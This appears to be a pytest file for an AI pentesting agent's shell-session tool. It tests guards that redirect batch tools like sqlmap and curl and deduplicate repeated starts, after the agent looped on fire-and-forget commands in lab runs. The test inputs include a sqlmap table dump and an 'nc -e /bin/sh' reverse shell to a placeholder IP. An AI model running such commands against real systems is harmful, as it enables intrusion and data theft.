"""Tests for shell_session_start's anti-loop guards.

Both come from a live loop where the model reissued ``sqlmap --dump`` via
``shell_session_start`` ~40× — the tool is fire-and-forget (returns "started"
in ~0s with no output), so a batch command that produces no immediate data
tricked the model into relaunching. Two guards:
  1. batch tools (sqlmap/nuclei/...) are redirected to ``run_command``;
  2. an identical start command is deduped on repeat.
"""

from __future__ import annotations

import kryon.tools.common.session_tools as st
from kryon.tools.common import command_dedup


def _start(command: str) -> str:
    return st.shell_session_start._raw_fn(command)


def test_batch_tool_redirected_to_run_command(monkeypatch):
    created: list[str] = []
    monkeypatch.setattr(st, "_create", lambda cmd: created.append(cmd) or "sid123")
    out = _start('sqlmap -u "http://t:3000/search?q=1" --dump -T Users')
    assert "run_command" in out
    assert "sqlmap" in out
    assert created == []  # never spawned a session


def test_batch_tool_matched_by_basename(monkeypatch):
    monkeypatch.setattr(st, "_create", lambda cmd: "sid")
    out = _start("/usr/bin/nuclei -u http://t")
    assert "run_command" in out


def test_curl_redirected_to_run_command(monkeypatch):
    # THM 'Hollow Shell' loop: the model drove a login POST via shell_session_start,
    # got "[session started]" with no body, and relaunched it 6× until abort. curl is
    # one-shot non-interactive → must redirect to run_command (which returns the body).
    created: list[str] = []
    monkeypatch.setattr(st, "_create", lambda cmd: created.append(cmd) or "sid")
    out = _start('curl -s -c /tmp/c.txt -X POST http://t:5000/login -d "user=a&pass=b"')
    assert "run_command" in out
    assert created == []  # never spawned a fire-and-forget session


def test_wget_redirected_to_run_command(monkeypatch):
    created: list[str] = []
    monkeypatch.setattr(st, "_create", lambda cmd: created.append(cmd) or "sid")
    out = _start("wget -qO- http://t:5000/dashboard")
    assert "run_command" in out
    assert created == []


def test_nc_reverse_shell_still_starts_session(monkeypatch):
    # Regression guard: nc is a legitimate interactive session (reverse-shell handler)
    # and must NOT be swept into the one-shot redirect alongside curl/wget.
    command_dedup.reset()
    monkeypatch.setattr(st, "_create", lambda cmd: "sidNC")
    monkeypatch.setattr(st, "_get_output", lambda sid, clear=False: "connect...")
    out = _start("nc 10.0.0.1 4444 -e /bin/sh")
    assert "run_command" not in out
    assert "sidNC" in out


def test_interactive_command_starts_session(monkeypatch):
    command_dedup.reset()
    monkeypatch.setattr(st, "_create", lambda cmd: "sidXYZ")
    monkeypatch.setattr(st, "_get_output", lambda sid, clear=False: "listening...")
    out = _start("nc -lvnp 4444")
    assert "sidXYZ" in out
    assert "started" in out


def test_identical_start_deduped_on_repeat(monkeypatch):
    command_dedup.reset()
    monkeypatch.setattr(st, "_create", lambda cmd: "sid")
    monkeypatch.setattr(st, "_get_output", lambda sid, clear=False: "")
    cmd = "nc -lvnp 5555"
    outs = [_start(cmd) for _ in range(6)]
    # a fresh start says "started"; the dedup guard eventually redirects instead
    # of spawning yet another identical session (threshold is 3 or 5 by profile).
    assert any("started" not in o for o in outs), outs
